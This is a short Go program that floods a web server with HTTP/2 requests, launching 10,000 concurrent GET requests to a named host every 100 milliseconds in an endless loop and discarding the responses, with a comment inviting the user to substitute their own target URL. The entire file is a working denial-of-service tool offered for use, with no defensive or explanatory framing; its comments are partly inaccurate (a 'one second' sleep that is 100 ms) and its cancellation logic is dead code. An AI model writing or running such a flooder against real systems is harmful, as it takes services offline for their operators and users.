package main

import (
	"net/http"
	"golang.org/x/net/http2"
	"sync"
	"time"
)

func main() {
	// Create a custom HTTP/2 Transport
	transport := &http2.Transport{}

	// Set up an HTTP/2 client with the custom Transport
	client := &http.Client{
		Transport: transport,
	}

	url := "https://live.zeroshield.net/" // Replace with your target URL

	numStreams := 10000 // Number of concurrent streams

	// Create a channel to signal cancellation
	cancelCh := make(chan struct{})

	// Use a wait group to wait for all Goroutines to finish
	var wg sync.WaitGroup

	for {
		for i := 0; i < numStreams; i++ {
			wg.Add(1)
			go func(i int) {
				defer wg.Done()

				// Create a new request
				req, err := http.NewRequest("GET", url, nil)
				if err != nil {
					return
				}

				// Send the request without handling the response
				_, _ = client.Do(req)

				// Check if the request was canceled
				select {
				case <-cancelCh:
					// Request was canceled
				default:
					// Request sent
				}
			}(i)
		}

		// Sleep for one second before sending more requests
		time.Sleep(100 * time.Millisecond)
	}

	// This part is unreachable because we're running the loop indefinitely
	// After a while, cancel all streams
	// time.Sleep(2 * time.Second)
	// close(cancelCh)

	// Wait for all Goroutines to finish
	// wg.Wait()
}
